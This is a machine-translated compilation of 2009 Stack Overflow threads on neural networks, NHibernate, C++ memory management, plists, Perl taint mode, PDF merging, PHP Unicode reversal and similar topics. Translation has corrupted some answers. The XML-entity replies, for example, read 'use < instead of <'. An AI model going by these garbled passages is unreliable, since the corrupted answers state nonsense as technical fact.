由于在谷歌上找到的很多这些网站都使用数学符号，我不知道这意味着什么，我想制作一个像这样的前馈神经网络：

```
 n1  
i1      n3
    n2      o1
i2      n4
    n3 
```

现在有人可以向我解释如何找到 o1 的值吗？当一个神经元没有任何输入处于活动状态时，如何使神经元处于活动状态？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-12T01:02:04.983

如果没有任何输入是实时的，那么您将不会从输出中得到任何东西。

自从我花一些时间在这方面已经有很长时间了，但在过去，我们会在等式中添加噪音。这可以是始终打开的输入形式，也可以是在将其推入神经网络之前向每个输入添加少量随机数。

有趣的是，在神经网络中使用噪声已被证明具有生物类似物。如果你想听什么，并加入一些白噪声，它会让你更容易听到。看也是一样。

至于您最初的问题-如何找出 o1 的值取决于...

*   整个神经网络中使用的公式。
*   n1 到 n4 的值。
*   输入。

[http://www.cheshireeng.com/Neuralyst/nnbg.htm](http://www.cheshireeng.com/Neuralyst/nnbg.htm)

有一些关于数学的基本信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T01:15:38.997

由于这个问题对我来说不是很清楚......我会这样说，以防它是你正在寻找的：

通常会在输入层和隐藏层中添加一个偏置神经元，以适应您提到的情况。这个额外的神经元始终处于活动状态，用于处理层上所有其他神经元都处于非活动状态的情况。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T02:12:30.660

This question is a good example of why "neural networks" do such an amazingly poor job of emulating the behavior of real-world neurons. Most real neurons have an intrinsic (or "natural") rate at which they fire action potentials, with no input from pre-synaptic neurons. The effect of pre-synaptic neurons is almost always to speed up or slow down this intrinsic firing rate, not to produce a single action potential in the post-synaptic neuron.

Why don't "neural networks" typically model this phenomenon? I don't know - you'd have to ask the people for whom "[the approach inspired by biology has more or less been abandoned for a more practical approach based on statistics and signal processing](http://en.wikipedia.org/wiki/Neural_networks)".

# nhibernate - 如何在 Expression.Or 中设置 2 个以上的表达式

> ID：434138
> 
> 赞同：8
> 
> 时间：2009-01-12T00:51:08.750
> 
> 标签：nhibernate, criteria, expression, icriteria

我想创建一个超过 3-4 Expression.Or 的查询？但是 Expression.Or 只是让我在其中添加两个表达式。

```
if (!string.IsNullOrEmpty(keyword))
                query
                    .Add(Expression.Or(
                             Expression.Like("Name", keyword, MatchMode.Anywhere),
                             Expression.Like("LastName", keyword, MatchMode.Anywhere)))
                    .Add(Expression.Or(
                             Expression.Like("Email1", keyword, MatchMode.Anywhere),
                             Expression.Like("Email2", keyword, MatchMode.Anywhere))); 
```

上面的代码生成“Name like %this% or LastName like %this% **AND** Email1 like %this% and Email2 like %this.

提前致谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-12T01:14:43.307

使用[析取](http://elliottjorgensen.com/nhibernate-api-ref/NHibernate.Expression/Disjunction.html)而不是或。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-07-31T08:04:10.023

你也可以使用|| 而不是 Or( ) 或 Disjunction( )。

# c++ - 结构数组和新/删除

> ID：434140
> 
> 赞同：7
> 
> 时间：2009-01-12T00:53:36.093
> 
> 标签：c++, arrays, memory-management, struct, new-operator

我有一个这样的结构：

```
class Items 
{
private:
    struct item
    {
        unsigned int a, b, c;
    };
    item* items[MAX_ITEMS];
} 
```

假设我想“删除”一个项目，如下所示：

```
items[5] = NULL; 
```

后来我在同一个地方创建了一个新项目：

```
items[5] = new item; 
```

我还需要打电话`delete[]`来清理吗？还是因为`items[]`在编译之前知道数组的边界，所以不需要这样做？

将该指针设置为 NULL 有效还是我应该在那里调用 delete？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-01-12T01:04:56.117

您需要`delete`在将其设置为 NULL 之前调用。（不需要将其设置为 NULL，如果您在删除指针后不小心尝试取消引用指针，它只会有助于减少错误。）

请记住，每次使用 时`new`，您都需要`delete`稍后在同一个指针上使用。永远不要在没有其他的情况下使用一个。

此外，`new []`并`delete []`以相同的方式一起使用，但你不应该`new []`与`delete`或`new`混合`delete []`。在您的示例中，由于您使用`new`（而不是`new []`创建对象数组）创建了对象，因此您必须使用`delete`（而不是`delete []`）删除对象。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-12T01:13:30.453

正如 Kluge 指出的那样，您会像这样在索引 5 处泄漏对象。但这听起来真的像你不应该手动执行此操作，而是在内部使用容器类`Item`。如果您实际上不需要将这些`item`对象存储为指针，请使用`std::vector<item>`该指针数组来代替`MAX_ITEMS`。如果需要，您也可以随时在中间插入或删除矢量元素。

如果您需要将对象存储为指针（通常如果 struct`item`实际上是多态的，与您的示例不同），您可以使用[Boost.PtrContainer](http://www.boost.org/doc/libs/1_37_0/libs/ptr_container/doc/ptr_container.html)中的 boost::ptr_vector<item>代替。

例子：

```
class Items {
private:
    struct item {
        unsigned int a, b, c;
    };
    std::vector<item> items;
}

if (items.size() > 5) // (just to ensure there is an element at that position)
    items.erase(items.begin() + 5); // no need to use operator delete at all 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T01:14:34.960

要删除项目，请使用：

删除项目[5]；

删除项目后，最好将删除的指针设置为 NULL，这样以后再误删除就不会报错了。

项目[5] = NULL

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T01:50:00.473

> 假设我想“删除”一个项目，如下所示：
> 
> > 项目[5] = NULL；

我对 Visual Basic 知之甚少，但这闻起来像 Visual Basic 编程习惯，因为“Set a = None”（或 Null，我不确定）会删除 a 指向的对象（或者更确切地说，减少它的引用计数，对于 COM对象）。

* * *

正如其他人指出的那样，您应该使用：

```
delete items[5];
items[5] = newContent; 
```

或者：

```
delete items[5];
items[5] = NULL; 
```

之后`delete[5]`，唯一可能使用存储在中的指针`items[5]`会给您带来麻烦。更糟糕的是，它可能在一开始就起作用，并且只有当您在`*items[5]`. 这些是使 C/C++ 编程“有趣”的原因，即真的很烦人（即使像我这样喜欢 C 的人也是如此）。

写入只是`delete items[5];`节省了可能是无用的写入，但这是一个过早的优化。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-12T08:07:43.160

为了清楚起见：您指的是调用“ `delete[]`”。我想你的意思是`delete`。

我提到这一点是因为 C++ 有两个独立的运算符，`operator delete`并且`operator delete[]`. 后者用于删除用 分配的对象数组，`operator new[]`在这种情况下*不适用。**你有一个指向*对象的指针数组，你必须通过重复调用`operator new`而不是一次调用来初始化它`operator new[]`。

我真正想说的是：您的使用`delete[]`令人困惑和模棱两可；将其更改为`delete`.

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-12T08:20:57.050

这里有一些相关的问题：

1.  根据您发布的代码，除非`struct`是，否则数组本身不会在堆上分配，因此您不需要`delete[]`数组。如果你用你创建了数组，`new[]`你将不得不这样`delete[]`做。
2.  发布的代码没有说明如何分配从数组中指向的对象。如果您在堆栈上分配这些对象，则*不能*删除它们（同样，这是极不可能的，因为当它们指向的对象超出范围时，您的指针将变得无效）。如果您在堆上分配它们（使用新的），那么当它们超出范围时您*必须删除它们。*
3.  As others have already suggested, life is much easier if you use a container -- especially an STL container -- and smart pointers -- which for now means pointers out of Boost.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-12T00:57:08.880

C++ 不是我的强项，但我很确定如果你将指针设置为`NULL`.

编辑：被泄漏的内存将是数组中的指针指向的内存。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-12T00:59:57.563

将 items[5] 设置为 NULL 不会删除与该项目关联的内存，它只是将指向该项目的指针设置为 NULL，因此内存泄漏。

您可以通过调用删除该项目：

```
delete items[5]; 
```

由于 C++ 没有自动垃圾收集，因此您需要删除不再需要的任何内存。

# iphone - NSDictionary initWithContentsOfFile：弄乱了 NSDecimalNumbers，为什么？

> ID：434145
> 
> 赞同：2
> 
> 时间：2009-01-12T00:58:48.690
> 
> 标签：iphone, objective-c, cocoa, cocoa-touch, currency

在我的 iPhone 应用程序中，我`NSDecimalNumber`用来存储一些货币汇率值。我在第一次启动应用程序时从网络上提取数据，然后在它们过时时再次提取数据，并将它们存储在`NSDictionary`; 然后我用`writeToFile:atomically:`.

首次启动应用程序时，我的费率转换方法可以正常工作。然而，当我第二次启动该应用程序时，使用转换方法加载的费率`-(NSDictionary*) initWithContentsOfFile:`停止工作，我得到了奇怪的结果。

我在 incriminated 方法中使用断点进行了一些调试，我发现费率数据被视为`NSCFNumber`，而不是`NSDecimalNumber`。因此，似乎`initWithContentsOfFile`没有为我的对象分配正确的类。为了记录，这些对象的实际值，如`description`方法中所示，对应于预期的速率值。

我还检查了生成的 plist 文件`writeToFile:atomically:`，发现费率存储为`real`; 我想知道这是否是正确的类型。

知道发生了什么吗？

在此先感谢，
戴维德

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-01-12T01:12:54.307

属性列表不区分十进制数和浮点数。该`real`元素包含一个浮点数。（实际上，序列化本身可能只是`NSNumber`发送`floatValue`给自己，而不知道实例实际上是子类的。这意味着当您*生成*plist 数据时会转换为浮点数，而不是在您读回它时。）

我认为，您必须将其存储为字符串。希望这是无损的。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T01:21:51.513

Plists 仅适用于某些数据类型，而 NSNumber 就是其中之一。如果您想要 NSDecimalNumber，那么您有两种方法可以解决。首先是继续使用 plist，然后在加载后将所有 NSNumbers 转换为 NSDecimalNumbers。二是改用 NSKeyedArchiver 来存储数据。这需要更多的代码，但意味着如果你保存一个 NSDecimalNumber，你会得到一个 NSDecimalNumber。

# perl - 如何在污点模式下使用 File::Find::Rule？

> ID：434149
> 
> 赞同：4
> 
> 时间：2009-01-12T00:59:55.037
> 
> 标签：perl, directory-listing

我正在尝试使用以下内容获取给定目录中的子目录列表：

```
#!/usr/bin/perl -wT
use strict;
use warnings;

use File::Find::Rule;
use Data::Dumper;

my @subdirs = File::Find::Rule->maxdepth(1)->directory->relative->in('mydir');

print Dumper(@subdirs); 
```

但是，运行它会得到结果：

> `Insecure dependency in chdir while running with -T switch`

我知道[`File::Find`](http://perldoc.perl.org/File/Find.html)有处理污染模式的选项，但我似乎无法在[`File::Find::Rule`](http://search.cpan.org/~rclamp/File-Find-Rule-0.30/lib/File/Find/Rule.pm). 是否可以做到以上几点？我应该使用其他方法列出子目录吗？我是否完全误解了一些我真正应该了解的关于污点模式的明显内容？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T01:08:15.207

（*编辑*！）好的，逻辑表明投入以下内容会起作用：

```
->extras( {untaint => 1, untaint_pattern => $untaint_pattern, untaint_skip => 1} ) 
```

这使您可以通过将参数直接传递给该模块的`find()`函数来使用 File::Find 的污染模式功能。顺便说一句，File::Find 提到应该`$untaint_pattern`使用`qr//`运算符进行设置。例如，默认值为

```
$untaint_pattern = qr|^([-+@\w./]+)$| 
```

**但是**，这不起作用！实际上，您的问题是 File::Find::Rule 中的一个已知错误。（例如，这里是[CPAN](http://rt.cpan.org/Public/Bug/Display.html?id=20418)和[Debian](http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=406205)错误报告。）如果您想要错误修复，那么这两个错误报告都有补丁。

如果您处于受限环境中，您可以做的一件事就是自己在代码中实现补丁。例如，如果您想将所有内容保存在一个文件中，您可以在`use File::Find::Rule`. 请注意，这是一个非常快速的解决方法，可能不是最理想的。如果它不适合您（例如，因为您的文件名中有空格），请更改使用的模式`qr|^([-+@\w./]+)$|`。

最后请注意，如果您希望您的代码组织更好一点，您可能希望将其转储到一个单独的包中，可能称为 MyFileFindRuleFix 或其他东西，您总是`use`在追求`File::Find::Rule`它自己。

```
package File::Find::Rule;
no warnings qw(redefine);
sub in {
    my $self = _force_object shift;

    my @found;
    my $fragment = $self->_compile( $self->{subs} );
    my @subs = @{ $self->{subs} };

    warn "relative mode handed multiple paths - that's a bit silly\n"
      if $self->{relative} && @_ > 1;

    my $topdir;
    my $code = 'sub {
        (my $path = $File::Find::name)  =~ s#^(?:\./+)+##;
        $path = "." if ($path eq ""); # See Debian bug #329377
        my @args = ($_, $File::Find::dir, $path);
        my $maxdepth = $self->{maxdepth};
        my $mindepth = $self->{mindepth};
        my $relative = $self->{relative};

        # figure out the relative path and depth
        my $relpath = $File::Find::name;
        $relpath =~ s{^\Q$topdir\E/?}{};
        my $depth = scalar File::Spec->splitdir($relpath);
        #print "name: \'$File::Find::name\' ";
        #print "relpath: \'$relpath\' depth: $depth relative: $relative\n";

        defined $maxdepth && $depth >= $maxdepth
           and $File::Find::prune = 1;

        defined $mindepth && $depth < $mindepth
           and return;

        #print "Testing \'$_\'\n";

        my $discarded;
        return unless ' . $fragment . ';
        return if $discarded;
        if ($relative) {
            push @found, $relpath if $relpath ne "";
        }
        else {
            push @found, $path;
        }
    }';

    #use Data::Dumper;
    #print Dumper \@subs;
    #warn "Compiled sub: '$code'\n";

    my $sub = eval "$code" or die "compile error '$code' $@";
    my $cwd = getcwd;
    # Untaint it
    if ( $cwd =~ qr|^([-+@\w./]+)$| ) {
        $cwd = $1;
    } else {
        die "Couldn't untaint \$cwd: [$cwd]";
    }
    for my $path (@_) {
        # $topdir is used for relative and maxdepth
        $topdir = $path;
        # slice off the trailing slash if there is one (the
        # maxdepth/mindepth code is fussy)
        $topdir =~ s{/?$}{}
          unless $topdir eq '/';
        $self->_call_find( { %{ $self->{extras} }, wanted => $sub }, $path );
    }
    chdir $cwd;

    return @found;
}
use warnings;
package main; 
```

# javascript - 使横向滚动网站快速加载的最佳方法是什么？

> ID：434188
> 
> 赞同：5
> 
> 时间：2009-01-12T01:25:17.653
> 
> 标签：javascript, mootools, web, pageload

我是堆栈溢出和编程的新手，所以请原谅我的任何尴尬措辞！

我正在构建一个图形丰富且大小为 680x9400 像素的横向滚动网站。我将使用一些 javascript 和/或 mootools 来创建一个很酷的横向滚动效果，类似于[http://sursly.com](http://sursly.com)。

我正在对所有使用的图像进行网络优化，但想知道是否有人对如何加快页面加载有任何其他想法？例如，有什么方法可以在水平部分中预加载网站？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T01:32:10.243

使用[jQuery Lazy Loading Plugin](http://www.appelsiini.net/2007/9/lazy-load-images-jquery-plugin)之类的东西，您可以获得明显的加速，因为只会加载可见图像。所以他们不会与屏幕外的图像竞争。

我知道您可能会使用 mootools，但如果他们没有类似的东西，我会感到惊讶。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T01:34:49.553

请注意，Sursly 网站上的大多数图形都是纯黑白的。这使得网站加载速度大大加快，因为可以优化文件。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-12T01:59:44.027

我同意 Past One 的回答，但会稍微修改一下：不要根据需要加载它，而是尽可能加载它。也就是说，最初只加载第一页。一旦加载，然后加载第二个，然后是第三个，依此类推。

跟踪哪些部分已加载和尚未加载，如果请求尚未加载的“页面”，则显示“请稍候”标志并将该页面提升到优先级队列中。

如果您有兴趣被搜索引擎索引，请记住要小心使用这些技术。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T02:03:33.847

大多数这样做的网站都像谷歌地图一样工作。他们将世界（或在您的情况下，虚拟横向滚动页面）划分为图块。当用户滚动时，AJAX 用于加载下一个图块，并在用户到达当前可见图块的边缘时显示。

如果需要，您可以在每一侧加载多个尚不可见的图块，但需要更多的客户端内存才能获得更好的用户体验。

# c# - 使用 C# 我应该如何从 docx 文档中提取标题字幕和段落

> ID：434203
> 
> 赞同：1
> 
> 时间：2009-01-12T01:39:12.430
> 
> 标签：c#, linq-to-xml, vsto, .net-3.5, docx

使用 C# 我应该如何从 docx 文档中提取标题字幕和段落。

我正在考虑通过 VSTO 做到这一点，但我知道对象模型这个词。我只熟悉 Excel 对象模型。

我应该采用 unzip + linq to XML 的方法吗？

使用 VSTO，我可以构建一个插件，该插件可用于编辑我将转换为 docx 和从 docx 转换的应用程序。

有没有人有过这种事情的经验？任何线索将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-15T02:22:12.420

我个人会采用 unzip + LINQ2XML 方法。（您可以使用框架中的内置支持解压缩，或者如果您使用的是旧版本，您可以使用 icsharpcode.net 提供的 zip 库

我会采用这种方法，因为对于像这样简单的事情，我宁愿不依赖 VSTO。这样，最终用户甚至不需要安装 Office。（并且没有其他许可证问题……我不知道细节）。

只是我的观点。

# linq-to-sql - 为什么我在使用 Linq to SQL 时会收到“无效的演员表”？

> ID：434204
> 
> 赞同：5
> 
> 时间：2009-01-12T01:39:26.750
> 
> 标签：linq-to-sql

当谈到 Linq to SQL 时，我是一个新手，但我希望你能帮忙。我使用扩展方法编写了以下 Linq to SQL 语句：

```
Cedb.ClassEvents.Where(c => c.ClassID == 1).Select(c => c).Single() 
```

其中 Cedb 是 Datacontext，ClassEvents 是一个表（用于在设施中举行的课程和活动），ClassID 是一个唯一的整数键。

此查询在 LinqPad（没有 Cedb）中运行良好。当它返回时，它说返回类型是“ClassEvent”。在 Visual Studio 的 Intellisense 中，它告诉我此查询的返回类型是 ClassEvent（在我的数据模型中创建）。但是，当我尝试将结果放入变量时：

```
var classEvent = Cedc.ClassEvents.Where(c.ClassID == 1).Select(c => c).Single(); 
```

然后我得到一个错误： InvalidCastException: Specified cast is not valid。如果我使用“ClassEvent”类代替 var，也会发生同样的事情。我是新手，但这似乎是一个真正的灌篮，而不是一个错误。是否有关于 Single 方法的某些我不知道会导致错误的东西？任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T03:15:28.943

Slace - 和任何其他相关方。“Invalid Cast Exception”错误的原因是底层数据模型发生了变化。smallint 字段已更改为 bit。因此，当系统试图将查询结果映射到“ClassEvent”数据结构时，模型（尚未更新）和数据表之间的冲突就出现了。

尽管如此，我很感激这个答案！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T02:03:19.853

你不需要同时做 Select 和 Single，事实上，你甚至不需要 Where，你可以逃脱（见[http://msdn.microsoft.com/en-us/library/bb535118 .aspx](http://msdn.microsoft.com/en-us/library/bb535118.aspx)）：

```
var classEvent = Cedc.ClassEvents.Single(c => c.ClassID == 1); 
```

我还建议不要使用`Single`，除非您 100% 确定`Func<T, bool>`将始终返回一个值，就好像它不返回一个值一样，您将抛出异常。更好的是`SingleOrDefault`在与对象交互之前使用并进行空检查（[http://msdn.microsoft.com/en-us/library/bb549274.aspx](http://msdn.microsoft.com/en-us/library/bb549274.aspx)）

# visual-studio - 显示通用类，例如 Table 在 Visual Studio 的 xml 注释中

> ID：434213
> 
> 赞同：10
> 
> 时间：2009-01-12T01:50:42.470
> 
> 标签：visual-studio, comments

我知道这可能是一个基本问题，但我似乎无法在任何地方找到答案。

我有这样的课

```
Table<T>
{} 
```

然后我有一些使用上述类的代码，我想评论一下我希望能够执行以下操作：

```
/// <summary>
/// blah blah blah Table<String>
/// </summary> 
```

但是我不能在评论中使用尖括号，因为它认为它是一个标签，当帮助出现时，它只是有一个关于 no end tag for 的错误。

如何在 Visual Studio 的注释中显示泛型类。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-01-12T01:53:30.340

您需要使用 XML 实体（某种转义序列）： < 对于 < 和 > 为 >。Intellisense 将正确显示 < as 和 >。

**编辑**：这是所有 XML 实体的备忘单列表：

```
&lt;   for <
&gt;   for >
&amp;  for &
&quot; for "
&apos; for ' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T01:52:38.423

尝试使用 < 而不是 <

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-07-21T23:01:12.087

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-03-22T21:05:28.760

If you place it in a `cref` element, you can instead use `{` and `}`.
That is, inside the summary, instead of `Table<string>`, you put `<cref="Table{string}"/>`

From [XML Documentation Comments](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/xmldoc/xml-documentation-comments):

> To refer to generic identifiers in code reference ... As a special case, the compiler parses the braces [in `crefs`] as angle brackets to make the documentation comment less cumbersome to author when referring to generic identifiers.

For more info about `cref`, see [cref Attribute](https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/xmldoc/cref-attribute):

> The `cref` attribute in an XML documentation tag means "code reference." It specifies that the inner text of the tag is a code element, such as a type, method, or property. Documentation tools like DocFX and Sandcastle use the cref attributes to automatically generate hyperlinks to the page where the type or member is documented.

* * *

NOTE: For convenience, I sometimes use `{}` instead of `<>` (in a summary comment) even if NOT part of a `cref`.

# asp.net - 在 ASP.NET 中的单个页面上添加 SSL

> ID：434223
> 
> 赞同：4
> 
> 时间：2009-01-12T01:56:24.267
> 
> 标签：asp.net

我希望“仅”我的登录页面启用 SSL。当用户使用[https://mysite.login.aspx](https://mysite.login.aspx)登录时，登录后用户应该被带到一个[http://mysite.default.aspx](http://mysite.default.aspx)

请一步一步告诉我怎么做。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-12T01:58:42.717

[这是为您提供的分步指南](http://msdn.microsoft.com/en-us/library/ms998310.aspx)！

[试用本指南](http://msdn.microsoft.com/en-us/library/ms998310.aspx)以获取自签名 SLL 证书。使用 IIS 7

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T03:04:13.397

除了 Filip 的建议之外，您可能还对免费的 http 模块感兴趣，该模块允许您要求某些页面或文件夹是安全的。因此，如果用户尝试在没有 SSL 的情况下访问您的登录页面，他们将被自动重定向到安全版本。该模块易于配置，如果您发现其他页面也需要安全性，它可能会派上用场。

查看详细信息并在[CodeProject下载源代码/二进制文件](http://www.codeproject.com/KB/web-security/WebPageSecurity_v2.aspx)

# c# - 部署winforms应用程序

> ID：434243
> 
> 赞同：3
> 
> 时间：2009-01-12T02:09:46.737
> 
> 标签：c#, deployment

如果您知道要频繁发布，那么部署 winforms 应用程序的最佳方法是什么

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T02:11:25.767

单击一次是您的最佳选择。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T02:45:01.640

如果您知道客户群将始终可以访问互联网连接并且他们只需要安装一个版本，那么单击一次非常好。对于大多数应用程序来说，这可能是正确的。

但如果不是这种情况，那么我建议您确保人们可以并排安装不同版本的应用程序。不要将您的程序集放在 GAC 中或让它们共享一个公共资源。这样，客户可以安装多个版本，并且它们都可以继续工作。Xcopy 部署会更好，但在实践中对于非平凡的应用程序很难实现。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T02:38:32.310

我推荐一个 NANT 构建脚本，使用 NSIS 作为你的设置脚本。两者都是免费提供的，并允许您拥有完全可扩展的一键式构建过程。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T03:33:46.833

在公司网络中，我执行以下操作：

*   创建强名称键
*   让所有机器“完全信任”具有该密钥的任何程序集 - 这可以通过组策略自动化。
*   使用强名称密钥签署应用程序
*   将应用程序放在网络共享上，并通过脚本或组策略将快捷方式推送到用户的桌面。

注意：假设您已经推出了 .NET 框架。这也可以自动化。如果您需要在客户端上安装其他资源，则需要单击一次。

# pdf - 是否可以以编程方式“链接”多个 PDF 文件，最好是从命令行？

> ID：434248
> 
> 赞同：5
> 
> 时间：2009-01-12T02:12:55.950
> 
> 标签：pdf

有没有办法在 Linux、Windows 或最好是 Mac OS X 中获取一堆 PDF 文件并将它们“链接”到一个“小册子”中，而无需拥有 Acrobat，最好无需手动执行此操作？

我已经安装了 TexShop、MikTex 等，如果它们的任何实用程序有帮助的话。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-01-12T02:36:23.967

鬼脚本方法：

```
gs -q -sPAPERSIZE=letter -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=out.pdf in1.pdf in2.pdf in3.pdf ... 
```

来自：[如何轻松连接 PDF](http://ansuz.sooke.bc.ca/software/pdf-append.php)

[ImageMagick](http://www.imagemagick.org/)方法：

```
convert file1.pdf file2.pdf file3.pdf out.pdf 
```

[pdftk](http://www.pdfhacks.com/pdftk/)方法：

```
pdftk file1.pdf file2.pdf file3.pdf cat output out.pdf 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-01-12T02:42:29.430

我尝试了几种不同的工具，并使用[PDF 工具包获得了最可靠的结果，`pdftk`](http://www.accesspdf.com/pdftk/) . 它似乎比尝试使用`gs`或弄乱转换为 PostScript 并返回更一致。它避免了每页处理一个图像，这是一种麻烦。

`pdftk`包含在基于 Debian 的 Linux 发行版中，也许还有其他发行版。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-09-24T13:53:23.877

我最近不得不对此进行研究并提出以下建议。最后我选择了 ImageMagick。

1.  合并太难了！[http://ansuz.sooke.bc.ca/software/pdf-append.php](http://ansuz.sooke.bc.ca/software/pdf-append.php)
2.  pdfjam 包中的 pdfjoin 似乎是类 unix 系统上的标准，但在 Windows 上不可用
3.  Coherentpdf 是多平台的。但是许可证费用高达 700 欧元
4.  pdftk 是多平台和开源的。不过貌似是3岁。
5.  Imagemagick 将合并 pdf 并从 jpg 生成 pdf。我知道它适用于 Linux 和 Windows。
6.  PDFsam 使用 iText 和 Java 工作

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-01-12T02:48:00.620

您可以在 Automator 中链接“获取选定项目”、“合并 PDF 页面”、“重命名 PDF 文档”和“移动 Finder 项目”操作以创建所需的工作流程。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T02:24:20.357

看看[多价文档工具](http://multivalent.sourceforge.net/Tools/)

[如果您无法通过Freshmeat.net](http://freshmeat.net)搜索其他工具

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T02:30:49.690

我已经在其他主题中提到过它，我会再次提到它：您可以使用[Ghostscript](http://www.ghostscript.com/)实用程序`pdf2ps`并`ps2pdf`这样做：

```
pdf2ps file1.pdf file1.ps  # Convert file1 to PostScript
pdf2ps file2.pdf file2.ps  # Convert file2 to PostScript
cat file2.ps >> file1.ps   # Concatenate files
ps2pdf file1.ps output.pdf # Convert back to PDF 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-12T03:11:25.613

我还使用了基于 Multivalent Java 的工具。它是对 Java MultiValent 主程序的简单调用，传入您要作为参数附加的每个 pdf 文件。

# php - 如何反转 Unicode 字符串

> ID：434250
> 
> 赞同：13
> 
> 时间：2009-01-12T02:13:52.093
> 
> 标签：php, string, unicode, reverse

[在对这个问题的答案](https://stackoverflow.com/questions/433525/choosing-asp-net-over-php-or-perl#433610)的评论中暗示PHP 不能反转 Unicode 字符串。

> 至于 Unicode，它可以在 PHP 中使用，因为大多数应用程序将其作为二进制处理。是的，PHP 是 8 位干净的。在 PHP 中尝试等效的方法： perl -Mutf8 -e 'print scalar reverse("ほげほげ")' 你会得到垃圾，而不是 "げほげほ"。– 杰罗克威

不幸的是，PHP 的 unicode 支持 atm 充其量“缺乏”是正确的。这将[有望随着 PHP6 发生巨大变化](http://74.125.77.132/search?q=cache:X3t6LgxXRa0J:derickrethans.nl/files/php6-unicode.pdf+php6+unicode)。

PHP的[MultiByte 函数](http://no2.php.net/manual/en/ref.mbstring.php)确实提供了处理 unicode 所需的基本功能，但它不一致并且缺少很多功能。其中之一是反转字符串的函数。

我当然想把这段文字翻过来，然后再弄清楚是否有可能。我创建了一个函数来完成反转这个 Unicode 文本的巨大复杂任务，所以在 PHP6 之前你可以放松一点。

测试代码：

```
$enc = 'UTF-8';
$text = "ほげほげ";
$defaultEnc = mb_internal_encoding();

echo "Showing results with encoding $defaultEnc.\n\n";

$revNormal = strrev($text);
$revInt = mb_strrev($text);
$revEnc = mb_strrev($text, $enc);

echo "Original text is: $text .\n";
echo "Normal strrev output: " . $revNormal . ".\n";
echo "mb_strrev without encoding output: $revInt.\n";
echo "mb_strrev with encoding $enc output: $revEnc.\n";

if (mb_internal_encoding($enc)) {
    echo "\nSetting internal encoding to $enc from $defaultEnc.\n\n";

    $revNormal = strrev($text);
    $revInt = mb_strrev($text);
    $revEnc = mb_strrev($text, $enc);

    echo "Original text is: $text .\n";
    echo "Normal strrev output: " . $revNormal . ".\n";
    echo "mb_strrev without encoding output: $revInt.\n";
    echo "mb_strrev with encoding $enc output: $revEnc.\n";

} else {
    echo "\nCould not set internal encoding to $enc!\n";
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2010-09-20T07:55:48.140

这是使用正则表达式的另一种方法：

```
function utf8_strrev($str){
 preg_match_all('/./us', $str, $ar);
 return implode(array_reverse($ar[0]));
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-08-26T22:32:26.833

这是另一种方式。这似乎无需指定输出编码即可工作（用几个不同`mb_internal_encoding`的 s 测试）：

```
function mb_strrev($text)
{
    return join('', array_reverse(
        preg_split('~~u', $text, -1, PREG_SPLIT_NO_EMPTY)
    ));
}
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-05-30T15:45:53.370

Grapheme 函数比 mbstring 和 PCRE 函数更正确地处理 UTF-8 字符串/Mbstring 和 PCRE 可能会破坏字符。您可以通过执行以下代码来查看它们之间的差异。

```
function str_to_array($string)
{
    $length = grapheme_strlen($string);
    $ret = [];

    for ($i = 0; $i < $length; $i += 1) {

        $ret[] = grapheme_substr($string, $i, 1);
    }

    return $ret;
}

function str_to_array2($string)
{
    $length = mb_strlen($string, "UTF-8");
    $ret = [];

    for ($i = 0; $i < $length; $i += 1) {

    $ret[] = mb_substr($string, $i, 1, "UTF-8");
}

    return $ret;
}

function str_to_array3($string)
{
    return preg_split('//u', $string, -1, PREG_SPLIT_NO_EMPTY);
}

function utf8_strrev($string)
{
    return implode(array_reverse(str_to_array($string)));
}

function utf8_strrev2($string)
{
    return implode(array_reverse(str_to_array2($string)));
}

function utf8_strrev3($string)
{
    return implode(array_reverse(str_to_array3($string)));
}

